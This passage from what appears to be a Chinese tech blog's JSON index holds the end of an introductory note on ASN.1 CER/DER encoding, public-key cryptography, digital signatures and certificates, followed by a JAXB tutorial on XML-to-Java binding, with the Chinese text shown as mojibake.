CERå’ŒDERçš„ä¸åŒä¹‹å¤„åœ¨äºå®ƒä»¬å¯¹å‘é€æ–¹æ–½åŠ çš„é™åˆ¶ã€‚CERå’ŒDERçš„åŸºæœ¬åŒºåˆ«æ˜¯ï¼Œåœ¨æŸäº›ç²¾ç¡®å®šä¹‰çš„æƒ…å†µä¸‹ï¼ŒDERé‡‡ç”¨å®šé•¿å½¢å¼ï¼ŒCERé‡‡ç”¨ä¸å®šé•¿å½¢å¼ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒDERæ€»æ˜¯å…·æœ‰å‰å¯¼é•¿åº¦ä¿¡æ¯ï¼Œè€ŒCERä½¿ç”¨å†…å®¹ç»“æŸå…«ä½å…ƒï¼Œè€Œä¸æ˜¯æä¾›ç¼–ç æ•°æ®çš„é•¿åº¦ã€‚å› æ­¤ï¼Œå¯¹äºå¤§çš„ç¼–ç å€¼ï¼ŒCERéœ€è¦è¾ƒå°‘çš„å…ƒæ•°æ®ï¼Œè€Œå¯¹äºå°çš„ç¼–ç å€¼ï¼ŒDERéœ€è¦è¾ƒå°‘çš„å…ƒæ•°æ®ã€‚ ä¸ºäº†ä¾¿äºç¼–ç è§„åˆ™ä¹‹é—´çš„é€‰æ‹©ï¼ŒX.690æ ‡å‡†æ–‡æ¡£æä¾›äº†ä»¥ä¸‹æŒ‡å¯¼: å¦‚æœç¼–ç çš„å€¼è¶³å¤Ÿå°ï¼Œèƒ½å¤Ÿé€‚åº”å¯ç”¨å†…å­˜ï¼Œå¹¶ä¸”éœ€è¦å¿«é€Ÿè·³è¿‡ä¸€äº›åµŒå¥—çš„å€¼ï¼Œé‚£ä¹ˆåŒºåˆ†ç¼–ç è§„åˆ™æ¯”è§„èŒƒç¼–ç è§„åˆ™æ›´åˆé€‚ã€‚è§„èŒƒåŒ–ç¼–ç è§„åˆ™æ¯”æ°å‡ºçš„ç¼–ç è§„åˆ™æ›´åˆé€‚çš„å¦‚æœæœ‰éœ€è¦ç¼–ç å€¼å¤ªå¤§äº†,ä»–ä»¬ä¸èƒ½è½»æ˜“é€‚åº”å¯ç”¨å†…å­˜æˆ–éœ€è¦ç¼–ç å’Œä¼ è¾“çš„ä¸€éƒ¨åˆ†ä»·å€¼åœ¨æ•´ä¸ªä»·å€¼æ˜¯å¯ç”¨çš„ã€‚åŸºæœ¬ç¼–ç è§„åˆ™æ¯”è§„èŒƒçš„æˆ–ä¸“æœ‰çš„ç¼–ç è§„åˆ™iæ›´åˆé€‚ å…¬é’¥,ç§é’¥,æ•°å­—è¯ä¹¦ å…¬é’¥ç§é’¥ Bobæœ‰ä¸¤æŠŠé’¥åŒ™ï¼Œä¸€æŠŠå«å…¬é’¥ï¼ˆpublic keyï¼‰ï¼Œä¸€æŠŠå«ç§é’¥ï¼ˆprivate keyï¼‰ Bobçš„å…¬é’¥å¯ä»¥å…¬å¼€ä¾›å…¶ä»–äººä½¿ç”¨ï¼Œä»–åªä¿ç•™è‡ªå·±çš„ç§é’¥ã€‚å…¬é’¥å’Œç§é’¥ç”¨æ¥åŠ è§£å¯†æ•°æ®ï¼Œå¦‚æœä½¿ç”¨ä»»æ„ä¸€æŠŠæ¥åŠ å¯†æ•°æ®ï¼Œé‚£ä¹ˆåªæœ‰ä½¿ç”¨å¦å¤–ä¸€æŠŠæ‰èƒ½è§£å¯†æ•°æ®ã€‚ Susanæƒ³ç»™Bobå†™ä¿¡ï¼Œå¥¹å¯ä»¥ä½¿ç”¨Bobçš„å…¬é’¥å°†å†…å®¹åŠ å¯†ä»¥åå‘é€ç»™Bobï¼ŒBobæ”¶åˆ°ä»¥åï¼Œä½¿ç”¨ç§é’¥è§£å¯†ä»¥ä¾¿é˜…è¯»å†…å®¹ã€‚Bobçš„çš„å…¶ä»–åŒäº‹å³ä½¿æˆªè·äº†Susanå‘é€ç»™Bobçš„ä¿¡ä»¶ï¼Œç”±äºæ²¡æœ‰Bobçš„ç§é’¥ï¼Œä¹Ÿæ— æ³•è§£å¯†ï¼Œä»è€Œç¡®ä¿æ•°æ®å®‰å…¨ã€‚ä»¥ä¸Šå°±æ˜¯ä½¿ç”¨å…¬é’¥å’Œç§é’¥åŠ è§£å¯†çš„è¿‡ç¨‹æ¼”ç¤ºã€‚ å¦‚æœBobç»™Susanå›ä¿¡ï¼Œå¦‚ä½•ä¿è¯æ•°æ®å®‰å…¨å‘¢ï¼Ÿä»–å¯ä»¥ä½¿ç”¨Susançš„å…¬é’¥åŠ å¯†æ¶ˆæ¯åå‘ç»™Susanï¼ŒSusanä½¿ç”¨è‡ªå·±çš„ç§é’¥è§£å¯†åé˜…è¯»ã€‚æ‰€ä»¥ä¿æŠ¤å¥½è‡ªå·±çš„ç§é’¥æ˜¯å¤šä¹ˆé‡è¦çš„äº‹æƒ…å•Šã€‚ æ•°å­—ç­¾å ç°åœ¨Bobå†³å®šç»™Patå†™ä¸€ä»½ä¿¡ï¼Œä¿¡ä»¶çš„å†…å®¹ä¸ç”¨åŠ å¯†ï¼Œä½†æ˜¯è¦ä¿è¯Patæ”¶åˆ°ä¿¡ä»¶åï¼Œèƒ½å¤Ÿç¡®è®¤ä¿¡ä»¶çš„ç¡®æ˜¯Bobå‘å‡ºçš„ï¼Œè€Œä¸æ˜¯åˆ«äººå†’å……Bobå‘ç»™Patçš„ï¼Œåº”è¯¥å¦‚æœåšå‘¢ï¼Ÿ Bobå°†ä¿¡ä»¶é€šè¿‡hashè½¯ä»¶è®¡ç®—ä¸€ä¸‹ï¼Œå¾—åˆ°ä¸€ä¸²æ¶ˆæ¯æ‘˜è¦ï¼ˆæœ‰çš„æ–‡ç« ä¹Ÿç§°ä¹‹ä¸ºâ€œhashå€¼â€ï¼‰ã€‚è¿™ä¸€è¿‡ç¨‹èƒ½å¤Ÿä¿è¯2ç‚¹ï¼š 1ã€è¿‡ç¨‹ä¸å¯é€†ã€‚å³ä¸èƒ½é€šè¿‡æ¶ˆæ¯æ‘˜è®¡ç®—å‡ºä¿¡ä»¶çš„å†…å®¹ã€‚ 2ã€æ¶ˆæ¯æ‘˜è¦ä¸ä¼šé‡å¤ã€‚å³å¦‚æœä¿¡ä»¶æœ‰ä»»ä½•æ”¹åŠ¨ï¼Œå†æ¬¡hashè®¡ç®—å‡ºçš„æ¶ˆæ¯æ‘˜è¦ä¸€å®šä¸ä¼šå’Œæ”¹åŠ¨å‰çš„æ¶ˆæ¯æ‘˜è¦ä¸€è‡´ã€‚ ç„¶åï¼ŒBobä½¿ç”¨è‡ªå·±çš„ç§é’¥ï¼Œå°†æ¶ˆæ¯æ‘˜è¦åŠ å¯†ã€‚åŠ å¯†åçš„ç»“æœï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºâ€œæ•°å­—ç­¾åâ€ã€‚ç°åœ¨ï¼ŒBobå°±å¯ä»¥å°†ä¿¡ä»¶è¿åŒæ•°å­—ç­¾åä¸€èµ·å‘ç»™Patã€‚ Patæ”¶åˆ°ä¿¡ä»¶ä»¥åï¼Œä¼šåš2ä»¶äº‹ï¼š 1ã€ä½¿ç”¨Bobçš„å…¬é’¥å°†æ•°å­—ç­¾åè§£å¯†ï¼Œå¦‚æœé¡ºåˆ©è§£å¯†ï¼Œè¯´æ˜çš„ç¡®æ˜¯Bobç­¾å‘çš„æ•°å­—ç­¾åï¼Œä¸æ˜¯åˆ«äººç­¾å‘çš„ï¼Œå› ä¸ºBobçš„ç§é’¥æ²¡æœ‰å…¬å¼€ã€‚ 2ã€Patä½¿ç”¨hashè½¯ä»¶å¯¹ä¿¡ä»¶å†æ¬¡è¿›è¡Œhashè®¡ç®—ï¼Œå’Œè§£å¯†æ•°å­—ç­¾åå¾—åˆ°çš„æ¶ˆæ¯æ‘˜è¦å¯¹æ¯”ï¼Œå¦‚æœä¸€è‡´ï¼Œè¯´æ˜ä¿¡ä»¶æ²¡æœ‰ç¯¡æ”¹ï¼Œç¡®å®æ˜¯Bobå‘å‡ºçš„ã€‚è¿™å°±æ˜¯æ•°å­—ç­¾åçš„è¿‡ç¨‹ã€‚å®ƒèƒ½å¤Ÿç¡®ä¿ç­¾åäººå‘å‡ºçš„æ¶ˆæ¯ä¸è¢«ç¯¡æ”¹ï¼Œä¹Ÿèƒ½è¯æ˜çš„ç¡®æ˜¯ç­¾åäººå‘å‡ºçš„æ¶ˆæ¯ã€‚ æ•°å­—è¯ä¹¦ ä½¿ç”¨æ•°å­—è¯ä¹¦å¯ä»¥ç¡®ä¿å…¬é’¥ä¸è¢«å†’å……ã€‚æ•°å­—è¯ä¹¦æ˜¯ç»è¿‡æƒå¨æœºæ„ï¼ˆCAï¼‰è®¤è¯çš„å…¬é’¥ï¼Œé€šè¿‡æŸ¥çœ‹æ•°å­—è¯ä¹¦ï¼Œå¯ä»¥çŸ¥é“è¯¥è¯ä¹¦æ˜¯ç”±é‚£å®¶æƒå¨æœºæ„ç­¾å‘çš„ï¼Œè¯ä¹¦ä½¿ç”¨äººçš„ä¿¡æ¯ï¼Œä½¿ç”¨äººçš„å…¬é’¥ã€‚å®ƒæœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š 1ã€ç”±ä¸“é—¨çš„æœºæ„ç­¾å‘çš„æ•°å­—è¯ä¹¦æ‰å®‰å…¨æœ‰æ•ˆã€‚ 2ã€ç­¾å‘æ•°å­—è¯ä¹¦æ˜¯æ”¶è´¹çš„ã€‚ 3ã€ä¸ä¼šè¢«å†’å……ï¼Œå®‰å…¨å¯ä¿¡ã€‚ 4ã€æ•°å­—è¯ä¹¦æœ‰ä½¿ç”¨æœŸé™ï¼Œè¿‡äº†ä½¿ç”¨æœŸé™ï¼Œè¯ä¹¦å˜ä¸ºä¸å¯ç”¨ã€‚CAä¹Ÿå¯ä»¥åœ¨è¯•ç”¨æœŸå†…ï¼Œå¯¹è¯ä¹¦è¿›è¡Œä½œåºŸæ“ä½œã€‚ å…¬é’¥ç§é’¥è¯ä¹¦ç”Ÿæˆ å‚è€ƒ: ç”ŸæˆOpenSSL &amp;&amp; GntTLS &amp;&amp; WolfSSL keys æ–‡æ¡£","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"ç¬”è®°","slug":"ç¬”è®°","permalink":"https://www.sizaif.com/navigation/categories/%E7%AC%94%E8%AE%B0/"},{"name":"SSL","slug":"ç¬”è®°/SSL","permalink":"https://www.sizaif.com/navigation/categories/%E7%AC%94%E8%AE%B0/SSL/"},{"name":"SSL","slug":"æŠ€æœ¯å‘/SSL","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/SSL/"}],"tags":[{"name":"SSL","slug":"SSL","permalink":"https://www.sizaif.com/tags/SSL/"},{"name":"ç¬”è®°","slug":"ç¬”è®°","permalink":"https://www.sizaif.com/tags/%E7%AC%94%E8%AE%B0/"}],"author":"sizaif"},{"title":"JAXB å­¦ä¹ ","slug":"JAXB-å­¦ä¹ ","date":"2021-08-10T05:53:06.000Z","updated":"2021-09-19T10:14:38.067Z","comments":true,"path":"posts/a893dad1/","link":"","permalink":"https://www.sizaif.com/posts/a893dad1/","excerpt":"","text":"JAXB å­¦ä¹  ğŸ˜„ @Auther: sizaif ğŸ“† 2021-06-06 21:13:30 [TOC] è¯´æ˜ Java XMLç»‘å®šä½“ç³»ç»“æ„(JAXB)é€šè¿‡JAXBåº”ç”¨ç¨‹åºçš„ç¤ºä¾‹ä»‹ç»äº†Java XMLç»‘å®šä½“ç³»ç»“æ„(JAXB)æŠ€æœ¯ã€‚ åœ¨é˜…è¯»æœ¬æ•™ç¨‹ä¹‹å‰ è¦ç†è§£å’Œä½¿ç”¨XMLç»‘å®šJavaä½“ç³»ç»“æ„(JAXB)æ•™ç¨‹ä¸­çš„ä¿¡æ¯ï¼Œæ‚¨åº”è¯¥äº†è§£ä»¥ä¸‹æŠ€æœ¯: Javaç¼–ç¨‹è¯­è¨€åŠå…¶å¼€å‘ç¯å¢ƒ å¯æ‰©å±•æ ‡è®°è¯­è¨€ æœ¬æ•™ç¨‹åªè¯¦ç»†ç ”ç©¶JAXBç‰¹æœ‰çš„ä»£ç ã€‚ JAXBæ¦‚è®º ç”¨äºXMLç»‘å®šçš„Javaä½“ç³»ç»“æ„(JAXB)æä¾›äº†ä¸€ç§å¿«é€Ÿè€Œæ–¹ä¾¿çš„æ–¹æ³•æ¥ç»‘å®šXMLæ¨¡å¼å’ŒJavaè¡¨ç¤ºï¼Œä½¿å¾—Javaå¼€å‘äººå‘˜å¯ä»¥å¾ˆå®¹æ˜“åœ°åœ¨Javaåº”ç”¨ç¨‹åºä¸­åˆå¹¶XMLæ•°æ®å’Œå¤„ç†å‡½æ•°ã€‚ä½œä¸ºæ­¤è¿‡ç¨‹çš„ä¸€éƒ¨åˆ†ï¼ŒJAXBæä¾›äº†å°†XMLå®ä¾‹æ–‡æ¡£ç¼–ç»„(è¯»å–)ä¸ºJavaå†…å®¹æ ‘ï¼Œç„¶åå°†Javaå†…å®¹æ ‘ç¼–ç»„(å†™å…¥)ä¸ºXMLå®ä¾‹æ–‡æ¡£çš„æ–¹æ³•ã€‚JAXBè¿˜æä¾›äº†ä¸€ç§ä»Javaå¯¹è±¡ç”ŸæˆXMLæ¨¡å¼çš„æ–¹æ³•ã€‚ AXB 2.0åŒ…å«äº†JAXB 1.0çš„å‡ ä¸ªé‡è¦æ”¹è¿›: æ”¯æŒæ‰€æœ‰W3C XML Schemaç‰¹æ€§ã€‚(JAXB 1.0æ²¡æœ‰ä¸ºæŸäº›W3C XML Schemaç‰¹æ€§æŒ‡å®šç»‘å®šã€‚) é€šè¿‡æ·»åŠ javax.xml.bind.annotationåŒ…æ¥æ§åˆ¶è¿™ç§ç»‘å®šï¼Œæ”¯æŒå°†javaç»‘å®šåˆ°xmlã€‚(JAXB 1.0æŒ‡å®šäº†XMLæ¨¡å¼åˆ°javaçš„æ˜ å°„ï¼Œä½†æ²¡æœ‰æŒ‡å®šjavaåˆ°XMLæ¨¡å¼çš„æ˜ å°„ã€‚) æ˜¾è‘—å‡å°‘äº†ç”Ÿæˆçš„æ¨¡å¼æ´¾ç”Ÿç±»çš„æ•°é‡ã€‚ é€šè¿‡JAXP 1.3éªŒè¯apiæä¾›çš„é¢å¤–éªŒè¯åŠŸèƒ½ã€‚ è¾ƒå°çš„è¿è¡Œæ—¶åº“ã€‚ æœ¬è¯¾æè¿°JAXBä½“ç³»ç»“æ„ã€å‡½æ•°å’Œæ ¸å¿ƒæ¦‚å¿µï¼Œå¹¶æä¾›ç¤ºä¾‹å’Œä½¿ç”¨JAXBçš„é€æ­¥è¿‡ç¨‹ã€‚ JAXBæ¶æ„ æœ¬èŠ‚æè¿°JAXBå¤„ç†æ¨¡å‹ä¸­çš„ç»„ä»¶å’Œäº¤äº’ã€‚ ç»“æ„æ¦‚è¿° ä¸‹å›¾æ˜¾ç¤ºäº†ç»„æˆJAXBå®ç°çš„ç»„ä»¶ã€‚ å›¾:JAXBä½“ç³»ç»“æ„æ¦‚è¿° JAXBå®ç°ç”±ä»¥ä¸‹æ¶æ„ç»„ä»¶ç»„æˆ: æ¨¡å¼ç¼–è¯‘å™¨:å°†æºæ¨¡å¼ç»‘å®šåˆ°ä¸€ç»„ä»æ¨¡å¼æ´¾ç”Ÿçš„ç¨‹åºå…ƒç´ ã€‚ç»‘å®šç”±åŸºäºxmlçš„ç»‘å®šè¯­è¨€æè¿°ã€‚ æ¨¡å¼ç”Ÿæˆå™¨:å°†ä¸€ç»„ç°æœ‰çš„ç¨‹åºå…ƒç´ æ˜ å°„åˆ°æ´¾ç”Ÿçš„æ¨¡å¼ã€‚æ˜ å°„æ˜¯ç”±ç¨‹åºæ³¨é‡Šæè¿°çš„ã€‚ ç»‘å®šè¿è¡Œæ—¶æ¡†æ¶:æä¾›è§£ç»„(è¯»å–)å’Œç¼–ç»„(å†™å…¥)æ“ä½œï¼Œä»¥ä¾¿ä½¿ç”¨æ¨¡å¼æ´¾ç”Ÿçš„æˆ–ç°æœ‰çš„ç¨‹åºå…ƒç´ è®¿é—®ã€æ“ä½œå’ŒéªŒè¯XMLå†…å®¹ã€‚ JAXBç»‘å®šè¿‡ç¨‹ ä¸‹å›¾æ˜¾ç¤ºäº†JAXBç»‘å®šè¿‡ç¨‹ä¸­å‘ç”Ÿçš„äº‹æƒ…ã€‚ å›¾:JAXBç»‘å®šè¿‡ç¨‹ä¸­çš„æ­¥éª¤ JAXBæ•°æ®ç»‘å®šè¿‡ç¨‹ä¸­çš„ä¸€èˆ¬æ­¥éª¤æ˜¯: ç”Ÿæˆç±»(Generate classes):å°†XMLæ¨¡å¼ç”¨ä½œJAXBç»‘å®šç¼–è¯‘å™¨çš„è¾“å…¥ï¼Œä»¥åŸºäºè¯¥æ¨¡å¼ç”ŸæˆJAXBç±»ã€‚ ç¼–è¯‘ç±»(Compile classes):å¿…é¡»ç¼–è¯‘æ‰€æœ‰ç”Ÿæˆçš„ç±»ã€æºæ–‡ä»¶å’Œåº”ç”¨ç¨‹åºä»£ç ã€‚ è§£ç»„(Unmarshal):æ ¹æ®æºæ¨¡å¼ä¸­çš„çº¦æŸç¼–å†™çš„XMLæ–‡æ¡£ç”±JAXBç»‘å®šæ¡†æ¶è§£ç»„ã€‚è¯·æ³¨æ„ï¼ŒJAXBè¿˜æ”¯æŒä»æ–‡ä»¶å’Œæ–‡æ¡£ä»¥å¤–çš„æº(å¦‚DOMèŠ‚ç‚¹ã€å­—ç¬¦ä¸²ç¼“å†²åŒºã€SAXæºç­‰)å¯¹XMLæ•°æ®è¿›è¡Œè§£ç»„ã€‚ ç”Ÿæˆå†…å®¹æ ‘(Generate content tree):è§£ç»„è¿‡ç¨‹ç”Ÿæˆä»ç”Ÿæˆçš„JAXBç±»å®ä¾‹åŒ–çš„æ•°æ®å¯¹è±¡çš„å†…å®¹æ ‘;è¿™ä¸ªå†…å®¹æ ‘è¡¨ç¤ºæºXMLæ–‡æ¡£çš„ç»“æ„å’Œå†…å®¹ã€‚ éªŒè¯(å¯é€‰)ğŸ˜¦ Validate (optional))è§£ç»„è¿‡ç¨‹æ¶‰åŠåœ¨ç”Ÿæˆå†…å®¹æ ‘ä¹‹å‰éªŒè¯æºXMLæ–‡æ¡£ã€‚æ³¨æ„ï¼Œå¦‚æœåœ¨æ­¥éª¤6ä¸­ä¿®æ”¹äº†å†…å®¹æ ‘ï¼Œè¿˜å¯ä»¥ä½¿ç”¨JAXB Validateæ“ä½œåœ¨å°†å†…å®¹ç¼–ç»„å›XMLæ–‡æ¡£ä¹‹å‰éªŒè¯æ›´æ”¹ã€‚ è¿‡ç¨‹å†…å®¹(Process content):é€šè¿‡ä½¿ç”¨ç»‘å®šç¼–è¯‘å™¨ç”Ÿæˆçš„æ¥å£ï¼Œå®¢æˆ·æœºåº”ç”¨ç¨‹åºå¯ä»¥ä¿®æ”¹Javaå†…å®¹æ ‘è¡¨ç¤ºçš„XMLæ•°æ®ã€‚ å°è£…(Marshal):å°†å¤„ç†è¿‡çš„å†…å®¹æ ‘å°é€åˆ°ä¸€ä¸ªæˆ–å¤šä¸ªXMLè¾“å‡ºæ–‡æ¡£ã€‚å¯ä»¥åœ¨ç¼–ç»„å‰å¯¹å†…å®¹è¿›è¡ŒéªŒè¯ã€‚ More About Unmarshalling è§£ç»„(Unmarshalling)ä¸ºå®¢æˆ·æœºåº”ç”¨ç¨‹åºæä¾›äº†å°†XMLæ•°æ®è½¬æ¢ä¸ºjaxbæ´¾ç”Ÿçš„Javaå¯¹è±¡çš„èƒ½åŠ›ã€‚å³ ä»xml -&gt; java object More About Marshalling Marshalling ä¸ºå®¢æˆ·ç«¯åº”ç”¨ç¨‹åºæä¾›å°†jaxbæ´¾ç”Ÿçš„Javaå¯¹è±¡æ ‘è½¬æ¢ä¸ºXMLæ•°æ®çš„èƒ½åŠ›ã€‚ å³ä» java object -&gt; xml é»˜è®¤æƒ…å†µä¸‹ï¼ŒMarshalleråœ¨ç”ŸæˆXMLæ•°æ®æ—¶ä½¿ç”¨UTF-8ç¼–ç ã€‚ å®¢æˆ·æœºåº”ç”¨ç¨‹åºä¸éœ€è¦åœ¨ç¼–ç»„ä¹‹å‰éªŒè¯Javaå†…å®¹æ ‘ã€‚ä¹Ÿä¸è¦æ±‚Javaå†…å®¹æ ‘ç›¸å¯¹äºå…¶åŸå§‹æ¨¡å¼æ˜¯æœ‰æ•ˆçš„ï¼Œä»¥ä¾¿å°†å…¶ç¼–ç»„ä¸ºXMLæ•°æ®ã€‚ More About Validation Validation æ˜¯éªŒè¯XMLæ–‡æ¡£æ˜¯å¦æ»¡è¶³æ¨¡å¼ä¸­è¡¨ç¤ºçš„æ‰€æœ‰çº¦æŸçš„è¿‡ç¨‹ JAXB 1.0åœ¨ç¼–ç»„æ—¶æä¾›éªŒè¯ï¼Œå¹¶åœ¨JAXBå†…å®¹æ ‘ä¸Šæ”¯æŒæŒ‰éœ€éªŒè¯ã€‚JAXB 2.0åªå…è®¸åœ¨è§£ç»„å’Œç¼–ç»„æ—¶è¿›è¡ŒéªŒè¯ã€‚webæœåŠ¡å¤„ç†æ¨¡å‹åœ¨è¯»å–æ•°æ®æ—¶æ˜¯å®½æ¾çš„ï¼Œè€Œåœ¨å†™å‡ºæ•°æ®æ—¶æ˜¯ä¸¥æ ¼çš„ã€‚ä¸ºäº†æ»¡è¶³è¯¥æ¨¡å‹ï¼Œåœ¨å°é€æ—¶é—´ä¸­æ·»åŠ äº†éªŒè¯ï¼Œä»¥ä¾¿ç”¨æˆ·å¯ä»¥ç¡®è®¤åœ¨ä¿®æ”¹JAXBè¡¨å•ä¸­çš„æ–‡æ¡£æ—¶æ²¡æœ‰ä½¿XMLæ–‡æ¡£å¤±æ•ˆã€‚ è¡¨ç¤º XML å†…å®¹ æœ¬èŠ‚æè¿° JAXB å¦‚ä½•å°† XML å†…å®¹è¡¨ç¤ºä¸º Java å¯¹è±¡ã€‚ XML æ¨¡å¼çš„ Java è¡¨ç¤º JAXB æ”¯æŒåœ¨ Java åŒ…ä¸­å¯¹ç”Ÿæˆçš„ç±»è¿›è¡Œåˆ†ç»„ã€‚ä¸€ä¸ªåŒ…åŒ…å«ä»¥ä¸‹å†…å®¹ï¼š ä» XML å…ƒç´ åç§°æ´¾ç”Ÿæˆ–ç”±ç»‘å®šå®šåˆ¶æŒ‡å®šçš„ Java ç±»åç§°ã€‚ ä¸€ä¸ªObjectFactoryçš„ç±»ï¼Œå®ƒæ˜¯ç”¨æ¥è¿”å›ä¸€ä¸ªå¿…ç„¶çš„Javaç±»çš„å®ä¾‹çš„å·¥å‚ã€‚ ç»‘å®š XML æ¨¡å¼ æœ¬èŠ‚ä»‹ç» JAXB ä½¿ç”¨çš„é»˜è®¤ XML-to-Java ç»‘å®šã€‚æ‰€æœ‰è¿™äº›ç»‘å®šéƒ½å¯ä»¥é€šè¿‡ä½¿ç”¨è‡ªå®šä¹‰ç»‘å®šå£°æ˜æ¥å…¨å±€æˆ–é€ä¸ªè¦†ç›–ã€‚æœ‰å…³é»˜è®¤ JAXB ç»‘å®šçš„å®Œæ•´ä¿¡æ¯ï¼Œè¯·å‚é˜… JAXB è§„èŒƒã€‚ ç®€å•ç±»å‹å®šä¹‰ ä½¿ç”¨ç®€å•ç±»å‹å®šä¹‰çš„æ¨¡å¼ç»„ä»¶é€šå¸¸ç»‘å®šåˆ° Java å±æ€§ã€‚å› ä¸ºæœ‰ä¸åŒç§ç±»çš„æ¶æ„ç»„ä»¶ï¼Œä»¥ä¸‹ Java å±æ€§å±æ€§ï¼ˆæ¶æ„ç»„ä»¶é€šç”¨ï¼‰åŒ…æ‹¬ï¼š åŸºç¡€ç±»å‹ é›†åˆç±»å‹ï¼Œå¦‚æœæœ‰ è°“è¯ å…¶ä½™çš„ Java å±æ€§å±æ€§æ˜¯ä½¿ç”¨ç®€å•ç±»å‹å®šä¹‰åœ¨æ¨¡å¼ç»„ä»¶ä¸­æŒ‡å®šçš„ã€‚ é»˜è®¤æ•°æ®ç±»å‹ç»‘å®š ä»¥ä¸‹éƒ¨åˆ†è§£é‡Šäº†é»˜è®¤çš„ schema-to-Javaã€ JAXBElementå’Œ Java-to-schema æ•°æ®ç±»å‹ç»‘å®šã€‚ Schema-to-Java Mapping Javaè¯­è¨€æä¾›äº†æ¯”XMLæ¨¡å¼æ›´ä¸°å¯Œçš„æ•°æ®ç±»å‹é›†,ä¸‹è¡¨æä¾›äº†JAXBä¸­XMLæ•°æ®ç±»å‹åˆ°Javaæ•°æ®ç±»å‹çš„æ˜ å°„ã€‚ XML Schema Type Java Data Type xsd:string java.lang.String xsd:integer java.math.BigInteger xsd:int int xsd.long long xsd:short short xsd:decimal java.math.BigDecimal xsd:float float xsd:double double xsd:boolean boolean xsd:byte byte xsd:QName javax.xml.namespace.QName xsd:dateTime javax.xml.datatype.XMLGregorianCalendar xsd:base64Binary byte[] xsd:hexBinary byte[] xsd:unsignedInt long xsd:unsignedShort int xsd:unsignedByte short xsd:time javax.xml.datatype.XMLGregorianCalendar xsd:date javax.xml.datatype.XMLGregorianCalendar xsd:g javax.xml.datatype.XMLGregorianCalendar xsd:anySimpleType java.lang.Object xsd:anySimpleType java.lang.String xsd:duration javax.xml.datatype.Duration xsd:NOTATION javax.xml.namespace.QName è¡¨:XMLæ¨¡å¼å†…ç½®æ•°æ®ç±»å‹çš„JAXBæ˜ å°„ JAXBElementå¯¹è±¡ å½“XMLå†…å®¹çš„æ´¾ç”ŸJavaè¡¨ç¤ºä¸èƒ½æ¨æ–­XMLå…ƒç´ ä¿¡æ¯æ—¶ï¼Œå°†æä¾›ä¸€ä¸ªJAXBElementå¯¹è±¡ã€‚è¯¥å¯¹è±¡å…·æœ‰è·å–å’Œè®¾ç½®å¯¹è±¡åç§°å’Œå¯¹è±¡å€¼çš„æ–¹æ³•ã€‚ Java-to-Schema Mapping ä¸‹è¡¨æ˜¾ç¤ºäº†Javaç±»åˆ°XMLæ•°æ®ç±»å‹çš„é»˜è®¤æ˜ å°„ã€‚ Java Class XML Data Type java.lang.String xs:string java.math.BigInteger xs:integer java.math.BigDecimal xs:decimal java.util.Calendar xs:dateTime java.util.Date xs:dateTime javax.xml.namespace.QName xs:QName java.net.URI xs:string javax.xml.datatype.XMLGregorianCalendar xs:anySimpleType javax.xml.datatype.Duration xs:duration java.lang.Object xs:anyType java.awt.Image xs:base64Binary javax.activation.DataHandler xs:base64Binary javax.xml.transform.Source xs:base64Binary java.util.UUID xs:string è¡¨:XMLæ•°æ®ç±»å‹åˆ°Javaç±»çš„JAXBæ˜ å°„ è‡ªå®šä¹‰ç”Ÿæˆçš„ç±»å’Œ Java ç¨‹åºå…ƒç´  ä»¥ä¸‹éƒ¨åˆ†æè¿°äº†å¦‚ä½•å®šåˆ¶ç”Ÿæˆçš„ JAXB ç±»å’Œ Java ç¨‹åºå…ƒç´ ã€‚ Schema-to-Java è‡ªå®šä¹‰JAXBç»‘å®šå£°æ˜ä½¿æ‚¨èƒ½å¤Ÿåœ¨XMLæ¨¡å¼ä¸­ç‰¹å®šäºXMLçš„çº¦æŸä¹‹å¤–è‡ªå®šä¹‰ç”Ÿæˆçš„JAXBç±»ï¼Œä»¥åŒ…æ‹¬ç‰¹å®šäºjavaçš„ç»†åŒ–ï¼Œä¾‹å¦‚ç±»å’ŒåŒ…åæ˜ å°„ã€‚ JAXB æä¾›äº†ä¸¤ç§è‡ªå®šä¹‰ XML æ¨¡å¼çš„æ–¹æ³•ï¼š ä½œä¸ºæº XML æ¨¡å¼ä¸­çš„å†…è”æ³¨é‡Š ä½œä¸ºä¼ é€’ç»™ JAXB ç»‘å®šç¼–è¯‘å™¨çš„å¤–éƒ¨ç»‘å®šå®šåˆ¶æ–‡ä»¶ä¸­çš„å£°æ˜ æœ¬æ–‡æ¡£åé¢æä¾›äº†å±•ç¤ºå¦‚ä½•å®šåˆ¶ JAXB ç»‘å®šçš„ä»£ç ç¤ºä¾‹ã€‚ Java-to-Schema javax.xml.bind.annotation åŒ…ä¸­å®šä¹‰çš„ JAXB æ³¨é‡Šå¯ç”¨äºè‡ªå®šä¹‰ Java ç¨‹åºå…ƒç´ åˆ° XML æ¨¡å¼çš„æ˜ å°„ã€‚ä¸‹è¡¨æ€»ç»“äº†å¯ç”¨äº Java åŒ…çš„ JAXB æ³¨é‡Šã€‚ è¡¨ï¼šä¸ Java åŒ…å…³è”çš„ JAXB æ³¨é‡Š ä¸‹è¡¨æ€»ç»“äº†å¯ä»¥ä¸Javaç±»ä¸€èµ·ä½¿ç”¨çš„JAXBæ³¨é‡Šã€‚ è¡¨ï¼šä¸ Java ç±»å…³è”çš„ JAXB æ³¨é‡Š ä¸‹è¡¨æ€»ç»“äº†å¯ç”¨äº Javaæšä¸¾ç±»å‹çš„JAXB æ³¨é‡Šã€‚ è¡¨ï¼šä¸ Javaæšä¸¾ ç±»å‹å…³è”çš„ JAXB æ³¨é‡Š ä¸‹è¡¨æ€»ç»“äº†å¯ç”¨äº Java å±æ€§å’Œå­—æ®µçš„ JAXB æ³¨é‡Šã€‚ è¡¨ï¼šä¸ Java å±æ€§å’Œå­—æ®µå…³è”çš„ JAXB æ³¨é‡Š ä¸‹è¡¨æ€»ç»“äº†å¯ç”¨äºå¯¹è±¡å·¥å‚çš„ JAXB æ³¨é‡Šã€‚ è¡¨ï¼šä¸å¯¹è±¡å·¥å‚å…³è”çš„ JAXB æ³¨é‡Š ä¸‹è¡¨æ€»ç»“äº†å¯ä¸é€‚é…å™¨ä¸€èµ·ä½¿ç”¨çš„ JAXB æ³¨é‡Šã€‚ 